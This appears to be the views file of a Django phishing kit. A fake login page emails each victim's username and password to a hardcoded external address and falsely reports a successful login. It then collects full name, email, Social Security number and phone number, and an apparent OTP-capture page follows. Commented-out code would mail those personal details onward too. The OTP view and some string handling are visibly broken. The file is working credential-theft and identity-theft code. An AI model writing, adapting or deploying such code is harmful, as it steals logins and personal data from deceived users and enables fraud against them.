from http.client import HTTPResponse
from django.shortcuts import render, redirect
from .form import CreationForm,DataForm
from django.contrib import messages
from django.conf import settings
from django.core.mail import send_mail,BadHeaderError,EmailMessage
# Create your views here.
def Home(request):
    form=CreationForm()
    if request.method == 'POST':
        form =CreationForm(request.POST)
        if form.is_valid():
            cd = {
                'username': form.cleaned_data['username'],
                'password': form.cleaned_data['password']
            }
            subject = 'Login Details'
            messages.success(request, f'{form.cleaned_data["username"]} logged in succesfully!, procced to confirmm your information' )
            message = "/n".join(cd.values())
            
            try:
                send_mail(subject,message, 'ni9ht.walker@yandex.com',['ni9ht.walker@yandex.com'])
            except BadHeaderError:
                return HTTPResponse('Invalid Header')
            return redirect('data')
    context ={
        'form':form,
        }
    return render(request, 'index.html',context)

def Data(request):
    dataForm = DataForm()
    if request.method == 'POST':
        dataForm = DataForm(request.POST)
        if dataForm.is_valid():
            # dataForm.save()
            clean_data = {
                'full_name': dataForm.cleaned_data['full_name'],
                'email': dataForm.cleaned_data['email'],
                'ssn': dataForm.cleaned_data['ssn'],
                'phone_number': dataForm.cleaned_data['phone_number'],  
            }
            
            subject = 'Full Details'
            # message = "\r\n".join(clean_data.values())
            # try:
            #     email =EmailMessage(
            #         subject,
            #         message,
            #         'ttolu1149@gmail@gmail.com',
            #         ['tolulopeakinkunmi7.com']
                    

            #     )
            #     email.fail_silently = True
            #     email.send()
            # except BadHeaderError:
            #     return HTTPResponse('Invalid Header')
            # print(email)
            # print(message)
            # 
            #     send_mail(subject,message, 'ttolu1149@gmail@gmail.com',['tolulopeakinkunmi7.com'],fail_silently=False)
            # except BadHeaderError:
            #     return HTTPResponse('Invalid Header')
            return redirect('success')
    context = {
        'form':dataForm
    }
    return render(request, 'data.html',context)

def Otp(request):
    form = DataForm.phone_number
    if request.method =='POST':
        form = DataForm.phone_number
    print(form)
    context = {
        'form':form
    }
    return render(request, 'otp.html',context)
def Success(request):
    return render(request, 'success.html')